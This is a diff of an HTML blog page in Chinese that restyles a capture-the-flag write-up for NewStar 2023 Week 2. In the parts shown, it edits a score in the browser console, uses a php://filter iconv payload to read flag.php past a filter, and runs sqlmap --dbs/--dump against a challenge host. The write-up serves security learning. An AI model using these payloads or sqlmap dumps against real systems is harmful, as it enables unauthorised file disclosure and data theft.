@@ -1,241 +1,362 @@
 <!DOCTYPE html>
-<html lang=en>
+<html lang="en">
 <head>
-    <!-- so meta -->
     <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="NewStar 2023 Week2WEB游戏高手  打开题目看到上述，显然不可能玩到100000分，首先bp抓包看看有什么发现    似乎没有什么有用信息，查看源代码，好像有有用信息app_v2.js js文件    查看js文件于是有了想法：是否可以直接修改原始的分数    调试器，在20行设置断点，F5刷新后，在控制台输入：gameScore &#x3D; 100000    接着返回调试器，可以看到">
-<meta property="og:type" content="article">
-<meta property="og:title" content="NewStar 2023 Week2">
-<meta property="og:url" content="https://iahzl.github.io/NewStar-WriteUp-Week2/index.html">
-<meta property="og:site_name" content="iah&#39;s blog">
-<meta property="og:description" content="NewStar 2023 Week2WEB游戏高手  打开题目看到上述，显然不可能玩到100000分，首先bp抓包看看有什么发现    似乎没有什么有用信息，查看源代码，好像有有用信息app_v2.js js文件    查看js文件于是有了想法：是否可以直接修改原始的分数    调试器，在20行设置断点，F5刷新后，在控制台输入：gameScore &#x3D; 100000    接着返回调试器，可以看到">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095418077.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095513886.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095623116.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095742045.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095940757.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100051189.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100224984.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017142837510.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093655169.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093800968.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017143949315.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144311370.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017144727107.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094041762.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094343511.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094430575.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094608740.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010094944563.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010095437194.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100336815.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010100505136.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010101448421.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025154033987.png">
-<meta property="og:image" content="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151245060.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010151350788.png">
-<meta property="og:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152809765.png">
-<meta property="og:image" content="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010152850074.png">
-<meta property="og:image" content="http://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231025151826920.png">
-<meta property="article:published_time" content="2023-10-16T07:29:17.000Z">
-<meta property="article:modified_time" content="2023-10-25T08:27:05.878Z">
-<meta property="article:author" content="iahzl">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="crypto">
-<meta property="article:tag" content="web">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095418077.png">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="S3a">
     
-    
-      
+    <title>
         
-          <link rel="shortcut icon" href="/images/favicon.ico">
+            NewStar 2023 Week2 |
         
-      
-      
-        
-          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
-        
-      
-    
-    <!-- title -->
-    <title>NewStar 2023 Week2</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
-
-  <script async src="https://www.googletagmanager.com/gtag/js?id=pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio"></script>
-  <script>
-      window.dataLayer = window.dataLayer || [];
-      function gtag(){dataLayer.push(arguments);}
-      gtag('js', new Date());
-      gtag('config', 'pjwW3MzIwiIEl1lYN-ZEbHa4nwnoXvXY4O3b-Awgio');
-  </script>
-
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
+        S3a&#39;s blog
+    </title>
     
 <link rel="stylesheet" href="/css/style.css">
 
-    <!-- persian styles -->
     
-    <!-- rss -->
+        <link rel="shortcut icon" href="/images/logo.svg">
     
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/font/css/fontawesome.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/font/css/regular.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/font/css/solid.min.css">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.0.0/source/font/css/brands.min.css">
     
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="iah's blog" type="application/atom+xml">
+        
+            
+        
+            
+                
+<link rel="stylesheet" href="/css/custom.css">
+
+            
+        
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"iahzl.github.io","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"S3a's blog","author":"S3a","avatar":"/images/avatar.svg","logo":"/images/logo.svg","favicon":"/images/logo.svg"},"menu":{"Home":"/","Archives":"/archives","Categories":"/categories","Links":"/links","About":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"素履之往,独行愿也.","hitokoto":false},"social_contact":{"enable":true,"links":{"github":"https://github.com/iahzl","weixin":null,"qq":"http://wpa.qq.com/msgrd?v=3&uin=3290188431&site=qq&menu=yes","weibo":null,"zhihu":null,"twitter":null,"facebook":null,"email":"mailto:3290188431@qq.com"}},"scroll":{"progress_bar":true,"percent":true,"hide_header":true},"home":{"category":true,"tag":false,"announcement":"欢迎来到S3a's blog!"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":true,"page_pv":true}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"valine","valine":{"appid":"7k3CLk60MtrFMwCeGukb3GQJ-gzGzoHsz","appkey":"qVXoRTYc2mDgd8leYtgZAeq2","server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"feed":{"type":"atom","path":"atom.xml","limit":20},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"jsdelivr"},"pjax":{"enable":true},"footer":{"since":2023,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":true,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":true,"css":[null,"/css/custom.css"],"js":[null,"/js/time.js"]},"links":[{"title":"欢迎添加友链"},{"name":"S3a","link":"https://iahzl.github.io/","description":"素履之往,独行愿也.","avatar":"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/ico.png"},"......"],"version":"4.0.0"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original article title","author":"Original article author","link":"Original article link"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="S3a's blog" type="application/atom+xml">
 </head>
 
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">Home</a></li><!--
-     --><!--
-       --><li><a href="/categories/">Categories</a></li><!--
-     --><!--
-       --><li><a href="/tags/">Tags</a></li><!--
-     --><!--
-       --><li><a href="/archives/">Writing</a></li><!--
-     --><!--
-       --><li><a target="_blank" rel="noopener" href="http://github.com/iahzl">Projects</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     --><!--
-       --><li><a href="/about/">About</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/xray-webscan%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/NewStar-2023/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://iahzl.github.io/NewStar-WriteUp-Week2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&text=NewStar 2023 Week2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&is_video=false&description=NewStar 2023 Week2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=NewStar 2023 Week2&body=Check out this article: https://iahzl.github.io/NewStar-WriteUp-Week2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&title=NewStar 2023 Week2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://iahzl.github.io/NewStar-WriteUp-Week2/&name=NewStar 2023 Week2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://iahzl.github.io/NewStar-WriteUp-Week2/&t=NewStar 2023 Week2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
 
-    </div>
+<body>
+<div class="progress-bar-container">
     
+        <span class="scroll-progress-bar"></span>
     
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStar-2023-Week2"><span class="toc-number">1.</span> <span class="toc-text">NewStar 2023 Week2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-number">1.1.1.</span> <span class="toc-text">游戏高手</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#include-0%E3%80%820"><span class="toc-number">1.1.2.</span> <span class="toc-text">include 0。0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-sql"><span class="toc-number">1.1.3.</span> <span class="toc-text">ez_sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Unserialize"><span class="toc-number">1.1.4.</span> <span class="toc-text">Unserialize?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Upload-again"><span class="toc-number">1.1.5.</span> <span class="toc-text">Upload again!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.6.</span> <span class="toc-text">R!!C!!E!!</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">1.2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BB%B4%E5%95%A4"><span class="toc-number">1.2.1.</span> <span class="toc-text">滴啤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%AD%A2%E4%B8%80%E4%B8%AApi"><span class="toc-number">1.2.2.</span> <span class="toc-text">不止一个pi</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#halfcandecode"><span class="toc-number">1.2.3.</span> <span class="toc-text">halfcandecode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#partial-decrypt"><span class="toc-number">1.2.4.</span> <span class="toc-text">partial decrypt</span></a></li></ol></li></ol></li></ol>
-      </div>
+
     
-  </span>
+        <span class="pjax-progress-bar"></span>
+        <i class="pjax-progress-icon fas fa-circle-notch fa-spin"></i>
+    
 </div>
 
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
     
-    <div class="content index py4 ">
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/about/">
+                    <img src="/images/logo.svg">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               S3a&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                LINKS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">LINKS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+
+        <div class="article-content-container border-box">
+
+            
+
+            <div class="article-content-bottom border-box">
+                
+                    <div class="article-title">
+                        NewStar 2023 Week2
+                    </div>
+                
+
+                
+                    <div class="article-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/avatar.svg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author">
+                                <span class="name">S3a</span>
+                                
+                                    <span class="author-badge">Lv3</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="article-meta-info-container border-box post">
+    <div class="article-meta-info border-box">
         
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
+
+
+        
+            <span class="meta-info-item article-create-date">
+                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
+                <span class="pc">2023-10-16 15:29:17</span>
+                <span class="mobile">2023-10-16 15:29</span>
+            </span>
+
+            <span class="meta-info-item article-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="pc" data-updated="Wed Oct 25 2023 16:27:05 GMT+0800">2023-10-25 16:27:05</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="article-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/CTF/">CTF</a></li>
+                        
+                    
+                            <li class="category-item">&nbsp;<i class="icon fas fa-angle-right"></i>&nbsp;<a href="/categories/CTF/NewStar-2023/">NewStar 2023</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="article-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul class="article-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/ctf/">ctf</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/crypto/">crypto</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/web/">web</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item article-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.7k Words</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>8 Mins</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
     
-    <h1 class="posttitle p-name" itemprop="name headline">
-        NewStar 2023 Week2
-    </h1>
+</div>
 
+                            </div>
+                        </div>
+                    </div>
+                
 
+                <div class="article-content keep-markdown-body">
+                    
 
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">iahzl</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2023-10-16T07:29:17.000Z" class="dt-published" itemprop="datePublished">2023-10-16</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/CTF/">CTF</a> › <a class="category-link" href="/categories/CTF/NewStar-2023/">NewStar 2023</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/crypto/" rel="tag">crypto</a>, <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>, <a class="p-category" href="/tags/web/" rel="tag">web</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content e-content" itemprop="articleBody">
-    <h1 id="NewStar-2023-Week2"><a href="#NewStar-2023-Week2" class="headerlink" title="NewStar 2023 Week2"></a>NewStar 2023 Week2</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095418077.png" alt="image-20231009095418077"></p>
+                    <h1 id="NewStar-2023-Week2"><a href="#NewStar-2023-Week2" class="headerlink" title="NewStar 2023 Week2"></a>NewStar 2023 Week2</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h3><p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095418077.png"
+                      alt="image-20231009095418077"
+                ></p>
 <ol>
 <li>打开题目看到上述，显然不可能玩到100000分，首先bp抓包看看有什么发现</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095513886.png" alt="image-20231009095513886"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095513886.png"
+                      alt="image-20231009095513886"
+                ></p>
 <ol start="2">
 <li>似乎没有什么有用信息，查看源代码，好像有有用信息<code>app_v2.js</code> js文件</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095623116.png" alt="image-20231009095623116"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095623116.png"
+                      alt="image-20231009095623116"
+                ></p>
 <ol start="3">
 <li>查看js文件于是有了想法：是否可以直接修改原始的分数</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095742045.png" alt="image-20231009095742045"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095742045.png"
+                      alt="image-20231009095742045"
+                ></p>
 <ol start="4">
 <li>调试器，在20行设置断点，F5刷新后，在控制台输入：<code>gameScore = 100000</code></li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095940757.png" alt="image-20231009095940757"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009095940757.png"
+                      alt="image-20231009095940757"
+                ></p>
 <ol start="5">
 <li>接着返回调试器，可以看到此时的<code>gameScore</code>的值为100000</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100051189.png" alt="image-20231009100051189"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100051189.png"
+                      alt="image-20231009100051189"
+                ></p>
 <ol start="6">
 <li>接着F8,让js代码顺利执行，进入游戏会发现原始分变成了100000，结束游戏即可得到flag</li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100224984.png" alt="image-20231009100224984"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231009100224984.png"
+                      alt="image-20231009100224984"
+                ></p>
 <h3 id="include-0。0"><a href="#include-0。0" class="headerlink" title="include 0。0"></a>include 0。0</h3><ol>
 <li>打开就看到源码</li>
 </ol>
@@ -245,7 +366,12 @@
 <li>发现过滤了<code>base</code>和<code>rot</code> ，但是还有其他一些过滤器可以用</li>
 <li>构造<strong>payload：</strong><code>php://filter//convert.iconv.SJIS*.UCS-4*/resource=flag.php</code></li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017142837510.png" alt="image-20231017142837510"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231017142837510.png"
+                      alt="image-20231017142837510"
+                ></p>
 <ol start="4">
 <li>成功拿到flag<code>flag&#123;670e28dc-940b-4d66-92ec-40be4a0ae771&#125;</code></li>
 </ol>
@@ -254,10 +380,20 @@
 <p><code>sqlmap -u &quot;http://a53134e7-8ebc-46e4-bc62-ac46e2b91837.node4.buuoj.cn:81/?id=TMP11503&quot; --dbs  </code></p>
 </li>
 </ol>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093655169.png" alt="image-20231010093655169"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093655169.png"
+                      alt="image-20231010093655169"
+                ></p>
 <ol start="2">
 <li><p>直接使用 <code>--dump</code>,列出所有的表数据</p>
-<p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093800968.png" alt="image-20231010093800968"></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20231010093800968.png"
+                      alt="image-20231010093800968"
+                ></p>
 </li>
 </ol>
 <p>​	<code>flag&#123;ae2227f2-2ea1-4cd8-84b7-ad1d21cda25d&#125;</code></p>
@@ -274,7 +410,12 @@
 </ol>
